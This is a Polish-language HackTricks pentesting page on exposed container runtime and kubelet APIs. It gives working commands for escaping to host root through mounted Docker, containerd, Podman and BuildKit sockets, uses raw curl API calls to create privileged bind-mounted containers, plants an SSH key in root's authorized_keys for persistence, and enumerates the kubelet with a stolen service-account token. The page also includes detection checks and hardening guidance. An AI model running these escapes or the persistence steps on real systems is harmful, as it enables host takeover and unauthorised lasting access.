# Ekspozycja Runtime API i Daemona

{{#include ../../../banners/hacktricks-training.md}}

## Przegląd

Wiele rzeczywistych przejęć kontenerów wcale nie zaczyna się od ucieczki z namespace. Zaczynają się od dostępu do control plane runtime'u. Jeśli workload może komunikować się z `dockerd`, `containerd`, CRI-O, Podmanem lub kubeletem przez zamontowany socket Unix albo udostępniony listener TCP, atakujący może zażądać utworzenia nowego kontenera z większymi uprawnieniami, zamontować system plików hosta, dołączyć do namespace'ów hosta lub pobrać poufne informacje o węźle. W takich przypadkach API runtime'u stanowi właściwą granicę bezpieczeństwa, a jego przejęcie jest w praktyce zbliżone do przejęcia hosta.

Dlatego ekspozycję socketu runtime'u należy dokumentować oddzielnie od zabezpieczeń jądra. Kontener ze standardową konfiguracją seccomp, capabilities i ograniczeniami MAC może nadal dzielić tylko jedno wywołanie API od przejęcia hosta, jeśli zamontowano w nim `/var/run/docker.sock` lub `/run/containerd/containerd.sock`. Izolacja jądra bieżącego kontenera może działać dokładnie zgodnie z założeniami, podczas gdy płaszczyzna zarządzania runtime'em pozostaje całkowicie odsłonięta.

## Modele dostępu do Daemona

Docker Engine tradycyjnie udostępnia swój uprzywilejowany interfejs API przez lokalny socket Unix `unix:///var/run/docker.sock`. Historycznie udostępniano go również zdalnie przez listenery TCP, takie jak `tcp://0.0.0.0:2375`, albo listener zabezpieczony TLS na porcie `2376`. Zdalne udostępnienie daemona bez silnego TLS i uwierzytelniania klienta skutecznie zmienia Docker API w zdalny interfejs root.

containerd, CRI-O, Podman i kubelet udostępniają podobne powierzchnie o dużym wpływie. Nazwy i procedury działania się różnią, ale zasada pozostaje ta sama. Jeśli interfejs pozwala wywołującemu tworzyć workloady, montować ścieżki hosta, pobierać dane uwierzytelniające lub modyfikować działające kontenery, jest to uprzywilejowany kanał zarządzania i należy go odpowiednio traktować.

Webowy interfejs zarządzania kontenerami może udostępniać tę samą granicę, nawet jeśli konto lokalne nie ma bezpośredniego dostępu do socketu. Na przykład [Portainer issue #493](https://github.com/portainer/portainer/issues/493) opisywał możliwość zresetowania hasła administratora bez uwierzytelnienia w starszej wersji 1.11.1. Traktuj lokalnie dostępny interfejs wyłącznie jako trop do dalszej weryfikacji: potwierdź zainstalowaną wersję i sposób uwierzytelniania, faktyczny zakres uprawnień administratora oraz to, czy zarządzany przez niego endpoint może tworzyć kontenery z zapisywalnym bind mountem hosta. [Dokumentacja Portainera](https://docs.portainer.io/admin/environments/add/docker/socket) informuje, że zarządzanie oparte na sockecie wymaga dostępu do socketu Docker; endpoint działający bez roota lub z ograniczeniami zmienia wpływ na hosta. Nie wyciągaj wniosków o luce w uwierzytelnianiu ani dostępie root do hosta wyłącznie na podstawie nazwy procesu, portu czy ciągu wersji.

Typowe lokalne ścieżki, które warto sprawdzić:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```

Starsze lub bardziej wyspecjalizowane stosy mogą również udostępniać punkty końcowe, takie jak `dockershim.sock`, `frakti.sock` lub `rktlet.sock`. We współczesnych środowiskach spotyka się je rzadziej, ale należy podchodzić do nich z taką samą ostrożnością, ponieważ są to interfejsy kontroli środowiska uruchomieniowego, a nie zwykłe gniazda aplikacji.

## Bezpieczny dostęp zdalny

Jeśli demon musi być dostępny poza lokalnym gniazdem, połączenie należy zabezpieczyć za pomocą TLS, najlepiej z uwierzytelnianiem wzajemnym, tak aby demon weryfikował klienta, a klient — demona. Dawny zwyczaj udostępniania demona Docker przez zwykłe HTTP dla wygody to jeden z najgroźniejszych błędów w administracji kontenerami, ponieważ interfejs API jest na tyle rozbudowany, że pozwala bezpośrednio tworzyć uprzywilejowane kontenery.

Historyczna konfiguracja Docker wyglądała tak:

```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```

Na hostach opartych na systemd komunikacja z daemonem może również odbywać się przez `fd://`, co oznacza, że proces dziedziczy wcześniej otwarty socket od systemd, zamiast samodzielnie go wiązać. Najważniejszy wniosek nie dotyczy dokładnej składni, lecz konsekwencji dla bezpieczeństwa. Gdy tylko daemon nasłuchuje poza lokalnym socketem z restrykcyjnymi uprawnieniami, zabezpieczenia transportu i uwierzytelnianie klientów stają się koniecznością, a nie opcjonalnym wzmocnieniem zabezpieczeń.

## Nadużycia

Jeśli dostępny jest socket runtime, ustal, który to socket, czy istnieje kompatybilny klient oraz czy możliwy jest bezpośredni dostęp przez HTTP lub gRPC:

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```

Te polecenia są przydatne, ponieważ pozwalają odróżnić nieistniejącą ścieżkę, zamontowany, ale niedostępny socket oraz działające uprzywilejowane API. Jeśli klient działa, kolejne pytanie brzmi, czy API może uruchomić nowy kontener z host bind mountem lub współdzieleniem przestrzeni nazw hosta.

### Gdy nie zainstalowano żadnego klienta

Brak `docker`, `podman` lub innego wygodnego CLI nie oznacza, że socket jest bezpieczny. Docker Engine komunikuje się przez HTTP za pośrednictwem swojego Unix socketu, a Podman udostępnia zarówno API zgodne z Dockerem, jak i natywne API Libpod przez `podman system service`. Oznacza to, że minimalne środowisko wyposażone tylko w `curl` może wystarczyć do sterowania demonem:

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```

W przypadku wykonywania kodu PHP z ograniczeniem `open_basedir` [połączenia przez gniazda Unix pozostają alternatywną drogą](../../../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/#unix-sockets-outside-open_basedir), jeśli proces PHP ma uprawnienia systemu operacyjnego do nawiązywania połączeń.

Ma to znaczenie podczas post-exploitation, ponieważ obrońcy czasami usuwają standardowe pliki binarne klienta, ale pozostawiają podmontowane gniazdo zarządzania. Na hostach Podmana pamiętaj, że ścieżka o wysokiej wartości różni się w zależności od tego, czy wdrożenie działa w trybie rootful, czy rootless: `unix:///run/podman/podman.sock` dla instancji usługi rootful i `unix://$XDG_RUNTIME_DIR/podman/podman.sock` dla rootless.

### Pełny przykład: gniazdo Docker do roota hosta

Jeśli `docker.sock` jest dostępne, klasyczna metoda ucieczki polega na uruchomieniu nowego kontenera, który podmontowuje główny system plików hosta, a następnie wykonaniu `chroot` do niego:

```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```

Zapewnia to bezpośrednie wykonywanie poleceń jako root na hoście za pośrednictwem demona Docker. Skutki nie ograniczają się do odczytu plików. Po wejściu do nowego kontenera atakujący może modyfikować pliki hosta, wykradać dane uwierzytelniające, ustanawiać mechanizmy trwałego dostępu lub uruchamiać kolejne uprzywilejowane obciążenia.

### Pełny przykład: gniazdo Docker a przestrzenie nazw hosta

Jeśli atakujący woli wejść do przestrzeni nazw zamiast uzyskiwać dostęp wyłącznie do systemu plików:

```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

Ta ścieżka prowadzi do hosta przez zlecenie runtime’owi utworzenia nowego kontenera z jawnym dostępem do przestrzeni nazw hosta, zamiast wykorzystywania bieżącego kontenera.

### Docker Socket Persistence Pattern

Sterowanie runtime’em można wykorzystać także do utrzymania dostępu, a nie tylko do uruchomienia jednorazowej powłoki. Ogólny schemat polega na utworzeniu kontenera pomocniczego z montowaniem hosta, zapisaniu w zamontowanym systemie plików hosta materiałów umożliwiających autoryzowany dostęp lub hooka startowego, a następnie sprawdzeniu, czy host z niego korzysta.

Przykładowy schemat:

```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```

Ten sam pomysł można zastosować do jednostek systemd, fragmentów cron, plików startowych aplikacji lub kluczy SSH — zależnie od tego, co operator chce wykazać. Ważne jest to, że trwała zmiana jest wprowadzana za pośrednictwem uprawnień runtime daemon do systemu plików hosta, a nie przez dodatkowe uprawnienia w oryginalnym kontenerze.

### Pivot przez surowe Docker API

Gdy brakuje Docker CLI, ten sam przepływ z helperem i montowaniem hosta można zrealizować przez HTTP za pośrednictwem Unix socket. Ogólny przebieg to: potwierdzić dostęp do API, utworzyć kontener pomocniczy z host bind mount, uruchomić go, utworzyć instancję exec, a następnie ją uruchomić.

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
  -X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
  -X POST http://localhost/v1.54/containers/helper/exec
```

Końcowe żądanie `/exec/<id>/start` zależy od otrzymanego identyfikatora exec, ale kwestia bezpieczeństwa nie zależy od dokładnego sposobu obsługi JSON: bezpośredni dostęp API do demona Docker działającego z uprawnieniami roota wystarczy, by zażądać uruchomienia pomocniczego workloadu o wyższych uprawnieniach.

### Pełny przykład: socket containerd

Zamontowany socket `containerd` jest zazwyczaj równie niebezpieczny:<sup>[[1]](#references)</sup>

```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```

Jeśli dostępny jest klient bardziej przypominający Dockera, `nerdctl` może być wygodniejszy niż `ctr`, ponieważ udostępnia znajome flagi, takie jak `--privileged`, `--pid=host` i `-v`:

```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
  --privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```

Wpływ to ponownie kompromitacja hosta. Nawet jeśli brakuje narzędzi specyficznych dla Dockera, inne API runtime’u może nadal zapewniać taką samą władzę administracyjną. Węzłach Kubernetes `crictl` może również wystarczyć do reconnaissance i interakcji z kontenerami, ponieważ komunikuje się bezpośrednio z endpointem CRI.

### Gniazdo BuildKit

`buildkitd` łatwo przeoczyć, ponieważ wiele osób uważa go za „tylko backend do budowania”, ale demon nadal stanowi uprzywilejowaną płaszczyznę kontroli. Dostępny `buildkitd.sock` może pozwolić atakującemu na uruchamianie dowolnych kroków budowania, sprawdzanie możliwości workerów, korzystanie z lokalnych kontekstów w skompromitowanym środowisku oraz żądanie niebezpiecznych uprawnień, takich jak `network.host` lub `security.insecure`, jeśli demon został skonfigurowany tak, by na to zezwalać.

Przydatne pierwsze interakcje to:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```

Jeśli daemon akceptuje żądania build, sprawdź, czy dostępne są niebezpieczne uprawnienia:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
  --frontend dockerfile.v0 \
  --local context=. \
  --local dockerfile=. \
  --allow network.host \
  --allow security.insecure \
  --output type=local,dest=/tmp/buildkit-out
```

Dokładny wpływ zależy od konfiguracji daemona, ale usługa BuildKit działająca jako root z permissive entitlements nie jest nieszkodliwym udogodnieniem dla deweloperów. Traktuj ją jako kolejny cenny obszar administracyjny, szczególnie na runnerach CI i współdzielonych węzłach kompilacji.

### API Kubelet przez TCP

Kubelet nie jest runtime’em kontenerów, ale nadal należy do płaszczyzny zarządzania węzłem i często jest uwzględniany w dyskusjach o tej samej granicy zaufania. Jeśli secure port kubeleta `10250` jest dostępny z workloadu lub ujawnione zostaną poświadczenia węzła, pliki kubeconfig albo uprawnienia proxy, atakujący może być w stanie wyliczyć Pody, pobrać logi lub wykonywać polecenia w kontenerach lokalnych dla węzła, nie dotykając przy tym ścieżki admission serwera API Kubernetes.

Zacznij od prostego rozpoznania:

```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```

Jeśli ścieżka proxy kubelet lub API-server autoryzuje `exec`, klient obsługujący WebSocket może wykorzystać to do wykonania kodu w innych kontenerach na węźle. Dlatego też `nodes/proxy` z samym uprawnieniem `get` jest bardziej niebezpieczne, niż się wydaje: żądanie nadal może dotrzeć do endpointów kubelet, które wykonują polecenia, a te bezpośrednie interakcje z kubelet nie pojawiają się w standardowych logach audytu Kubernetes.<sup>[[2]](#references)</sup>

## Kontrole

Celem tych kontroli jest ustalenie, czy kontener może dotrzeć do jakiejkolwiek płaszczyzny zarządzania, która powinna pozostać poza granicą zaufania.

```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```

Co jest tu interesujące:

- Zamontowany socket runtime’u to zwykle bezpośrednia możliwość administracyjna, a nie jedynie ujawnienie informacji.
- Listener TCP na porcie `2375` bez TLS należy traktować jako warunek umożliwiający zdalne przejęcie.
- Zmienne środowiskowe, takie jak `DOCKER_HOST`, często wskazują, że workload został celowo zaprojektowany do komunikacji z runtime’em hosta.

## Domyślna konfiguracja runtime’ów

| Runtime / platforma | Stan domyślny | Domyślne działanie | Częste ręczne osłabianie zabezpieczeń |
| --- | --- | --- | --- |
| Docker Engine | Domyślnie lokalny Unix socket | `dockerd` nasłuchuje na lokalnym sockecie, a daemon zwykle działa z uprawnieniami roota | montowanie `/var/run/docker.sock`, udostępnianie `tcp://...:2375`, słabe lub brakujące TLS na `2376` |
| Podman | Domyślnie CLI bez daemona | Do zwykłego lokalnego użytku nie jest wymagany długo działający uprzywilejowany daemon; sockety API mogą być jednak udostępniane po włączeniu `podman system service` | udostępnianie `podman.sock`, szeroki zakres działania usługi, użycie API z uprawnieniami roota |
| containerd | Lokalny uprzywilejowany socket | API administracyjne jest udostępniane przez lokalny socket i zwykle używane przez narzędzia wyższego poziomu | montowanie `containerd.sock`, szeroki dostęp przez `ctr` lub `nerdctl`, udostępnianie uprzywilejowanych przestrzeni nazw |
| CRI-O | Lokalny uprzywilejowany socket | Endpoint CRI jest przeznaczony dla zaufanych komponentów działających lokalnie na węźle | montowanie `crio.sock`, udostępnianie endpointu CRI niezaufanym workloadom |
| Kubernetes kubelet | Lokalny interfejs zarządzania węzłem | Kubelet nie powinien być szeroko dostępny z Podów; dostęp może ujawniać stan Podów, poświadczenia i funkcje wykonywania poleceń, zależnie od konfiguracji authn/authz | montowanie socketów lub certyfikatów kubeleta, słabe uwierzytelnianie kubeleta, sieć hosta oraz dostępny endpoint kubeleta |



## References

- [1] [wykorzystywanie podatności socketu containerd, część 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Ryzyko związane z omijaniem Kubernetes API Server](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
